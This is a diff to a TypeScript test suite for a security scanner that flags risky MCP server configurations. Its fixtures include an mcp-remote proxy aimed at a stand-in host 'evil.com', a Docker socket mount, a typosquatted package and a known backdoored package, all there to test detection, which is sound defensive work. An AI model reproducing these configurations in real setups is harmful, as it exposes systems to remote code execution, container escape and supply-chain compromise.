@@ -887,6 +887,103 @@ describe('analyzeKnownThreats', () => {
     expect(findings.length).toBeGreaterThan(0)
     expect(findings.some((f) => f.description.includes('path traversal') || f.description.includes('Path traversal'))).toBe(true)
   })
+
+  // 2026-04 additions
+  it('detects mcp-remote OAuth RCE (CVE-2025-6514)', () => {
+    const server: MCPServer = {
+      name: 'remote-proxy',
+      command: 'npx',
+      args: ['mcp-remote', 'https://evil.com/mcp'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CVE-2025-6514') || f.description.includes('mcp-remote'))).toBe(true)
+  })
+
+  it('detects Postmark MCP supply chain backdoor', () => {
+    const server: MCPServer = {
+      name: 'postmark-mcp',
+      command: 'npx',
+      args: ['postmark-mcp'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('Postmark') || f.description.includes('BCC'))).toBe(true)
+  })
+
+  it('detects Docker socket access in MCP server args', () => {
+    const server: MCPServer = {
+      name: 'docker-tools',
+      command: 'node',
+      args: ['server.js', '-v', '/var/run/docker.sock:/var/run/docker.sock'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('Docker socket') || f.description.includes('container escape'))).toBe(true)
+  })
+
+  it('detects cryptocurrency wallet MCP servers', () => {
+    const server: MCPServer = {
+      name: 'ethereum-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('cryptocurrency') || f.description.includes('wallet'))).toBe(true)
+  })
+
+  it('detects MCP typosquatting patterns (mcp-servr)', () => {
+    const server: MCPServer = {
+      name: 'tools',
+      command: 'npx',
+      args: ['mcp-servr-filesystem'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('yposquat'))).toBe(true)
+  })
+
+  it('detects MCP Elicitation API abuse configuration', () => {
+    const server: MCPServer = {
+      name: 'social-eng',
+      command: 'node',
+      args: ['server.js', '--elicitation-mode=unrestricted'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('Elicitation') || f.description.includes('social-engineer'))).toBe(true)
+  })
+
+  it('detects CI/CD pipeline access MCP servers', () => {
+    const server: MCPServer = {
+      name: 'github-actions-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CI/CD') || f.description.includes('pipeline') || f.description.includes('workflow'))).toBe(true)
+  })
+
+  it('detects RAG/memory write access MCP servers', () => {
+    const server: MCPServer = {
+      name: 'rag-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('RAG') || f.description.includes('memory') || f.description.includes('vector'))).toBe(true)
+  })
 })
 
 describe('getKnownThreatCount', () => {
@@ -894,8 +991,8 @@ describe('getKnownThreatCount', () => {
     expect(getKnownThreatCount()).toBeGreaterThan(0)
   })
 
-  it('returns at least 147 threats (current database size)', () => {
-    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(147)
+  it('returns at least 174 threats (current database size)', () => {
+    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(174)
   })
 
   it('returns a consistent count', () => {
